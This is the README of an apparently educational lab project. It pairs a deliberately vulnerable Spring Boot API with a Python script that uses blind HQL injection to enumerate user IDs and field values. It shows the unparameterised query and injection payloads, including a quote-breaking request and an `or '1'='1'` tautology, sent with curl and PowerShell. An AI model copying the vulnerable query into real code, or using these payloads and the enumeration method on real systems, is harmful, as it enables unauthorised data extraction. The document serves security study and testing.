# HQLi Vulnerable REST API & Enumeration Script

This project demonstrates a REST API vulnerable to Hibernate Query Language (HQL) injection and includes a Python script that exploits the boolean oracle to enumerate user IDs and field values from the `User1` entity.

## Prerequisites

- Java 8 or higher
- Maven
- Python 3.x

## Setup & Run the Vulnerable API

1. **Clone the repository** (if not already done):
   ```powershell
   git clone <repo-url>
   cd hqli
   ```

2. **Build the project:**
   ```powershell
   ./mvnw clean package
   ```
   Or, on Windows:
   ```powershell
   .\mvnw.cmd clean package
   ```

3. **Run the API:**
   ```powershell
   ./mvnw spring-boot:run
   ```
   Or, on Windows:
   ```powershell
   .\mvnw.cmd spring-boot:run
   ```
   The API will start on `http://localhost:8443`.

## HQL injection in AgentRepository

The vulnerability is in `AgentRepository.checkValidAgent`:

```
private static final String CHECK_AGENT_EXISTS =
      "select count(*) from com.pdstat.hqli.entity.User1 usr " +
      "where usr.userId = '%s' or usr.altUserId = '%s'";

String hql = String.format(CHECK_AGENT_EXISTS, agentCode, agentCode);
Long count = em.createQuery(hql, Long.class).getSingleResult();
```

- The user-controlled `agentCode` is interpolated directly into the HQL string without parameters.
- An attacker can inject quotes and boolean conditions to alter the WHERE clause.
- The API returns different responses based on whether any rows match:
   - If count > 0: HTTP status code in JSON is `"400"` with payload message `"Agent Already Registered"`.
   - If no rows: JSON has status `"401"` and empty payload.
   - If HQL breaks (syntax error), the exception text is returned in `message` with status `"401"`.

This behavior creates a boolean oracle suitable for blind HQLi: the attacker can craft expressions so the query returns rows when the guessed condition is true and none when false.

## Sample requests to /checkvalidagent

Endpoint: `GET /checkvalidagent?agentCode=...`

Below are examples using PowerShell and curl. Replace the IDs to match users you created.

1) User does not exist (oracle false case)

PowerShell:
```powershell
Invoke-RestMethod -Uri "http://localhost:8443/checkvalidagent?agentCode=00000000" -Method Get
```

curl:
```bash
curl -k "http://localhost:8443/checkvalidagent?agentCode=00000000"
```

Expected JSON shape (no match):
```json
{"payload":{},"msgInfo":{"statusCode":"401","msgStatus":"failure","message":null}}
```

2) User exists (oracle true case)

PowerShell:
```powershell
Invoke-RestMethod -Uri "http://localhost:8443/checkvalidagent?agentCode=60002650" -Method Get
```

curl:
```bash
curl -k "http://localhost:8443/checkvalidagent?agentCode=60002650"
```

Expected JSON shape (match):
```json
{"payload":{"statusMsg":{"statusMsg":"Agent Already Registered","pageName":"NewUser"}},"msgInfo":{"statusCode":"400","msgStatus":"failure","message":"Failed to register user"}}
```

3) Break the HQL with a single quote (syntax error)

PowerShell:
```powershell
Invoke-RestMethod -Uri "http://localhost:8443/checkvalidagent?agentCode=60002650'" -Method Get
```

curl:
```bash
curl -k "http://localhost:8443/checkvalidagent?agentCode=60002650'"
```

The repository catches the exception and returns it in the JSON `message` with status `"401"`.

4) Fix/abuse the HQL with a tautology (injection)

PowerShell:
```powershell
Invoke-RestMethod -Uri "http://localhost:8443/checkvalidagent?agentCode=0'%20or%20'1'%3d'1" -Method Get
```

curl:
```bash
curl -k "http://localhost:8443/checkvalidagent?agentCode=0'%20or%20'1'%3d'1"
```

This closes the quote and appends `or '1'='1'`, making the WHERE clause always true, so the API responds as if a user exists (status `"400"`).
## Creating Example Users

Before running the enumeration script, create some users using the API. You can use `curl` or PowerShell:

### Using curl
```bash
curl -k -X POST "http://localhost:8443/create" \
   -H "Content-Type: application/json" \
   -d '{
      "userId": "60002650",
      "altUserId": "ALT001",
      "dob": "1990-01-01",
      "password": "pass1234"
   }'

curl -k -X POST "http://localhost:8443/create" \
   -H "Content-Type: application/json" \
   -d '{
      "userId": "60002925",
      "altUserId": "ALT002",
      "dob": "1992-02-02",
      "password": "pass5678"
   }'
```

### Using PowerShell
```powershell
$body1 = '{"userId": "60002650", "altUserId": "ALT001", "dob": "1990-01-01", "password": "pass1234"}'
Invoke-RestMethod -Uri "http://localhost:8443/create" -Method Post -Body $body1 -ContentType "application/json"

$body2 = '{"userId": "60002925", "altUserId": "ALT002", "dob": "1992-02-02", "password": "pass5678"}'
Invoke-RestMethod -Uri "http://localhost:8443/create" -Method Post -Body $body2 -ContentType "application/json"
```

After creating these users, you can run the Python script to enumerate them.

## Running the Python Enumeration Script

1. **Install Python dependencies:**
   If your script requires any packages (e.g., `requests`), install them:
   ```powershell
   pip install requests
   ```

2. **Run the script (basic):**
   ```powershell
   python .\hqli-all.py --entity com.pdstat.hqli.entity.User1 --fields .\fields.txt
   ```
   The script uses boolean-based HQLi to discover user IDs and brute-force selected properties.

3. Optional: enable debug logging of requests
   ```powershell
   python .\hqli-all.py --entity com.pdstat.hqli.entity.User1 --fields .\fields.txt --debug
   ```

4. Optional: ask AI to suggest additional likely fields (requires an OpenAI key)
   ```powershell
   $env:OPENAI_API_KEY = "<your key here>"
   python .\hqli-all.py --entity com.pdstat.hqli.entity.User1 --fields .\fields.txt --ai-mode --ai-field-count 15
   ```

## Script feature flags (hqli-all.py)

- `--entity <name>` (required): HQL entity to target, FQN or simple name (e.g., `com.pdstat.hqli.entity.User1`).
- `--fields <path>` (required): Path to a text wordlist of field names to try; one per line. Lines can contain commas/whitespace and `#` comments.
- `--entity-count <n>`: Number of user IDs to enumerate; default 2.
- `--debug`: Verbose request log line per probe.
- `--ai-mode`: Use OpenAI to suggest extra likely fields based on the entity name; requires `OPENAI_API_KEY` in the environment.
- `--ai-field-count <n>`: When `--ai-mode` is set, how many field names to fetch (default 10, clamped 1..50).

Other tuning knobs inside the script:
- `URL`, `PROXY`, `VERIFY_TLS`, `HEADERS`: HTTP settings for the target endpoint.
- `USERID_MAXLEN`, `USERID_CHARSET`: User ID discovery parameters.
- `DEFAULT_MAXLEN`, `FIELD_MAXLEN`, `CHARSET`: Field value brute-force parameters.
- `SLEEP_BETWEEN`: Throttle between requests.

The script prints a total request counter at the end of a run to help understand traffic volume.

## Project Structure
- `src/main/java/com/pdstat/hqli/` - Java source code for the REST API
- `hqli-all.py` - Python enumeration script
- `pom.xml` - Maven build file

## References
- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
- [SQL/HQL Injection Overview](https://owasp.org/www-community/attacks/SQL_Injection)

---
**Disclaimer:** This project is for educational and testing purposes only. Do not use on systems without proper authorization.
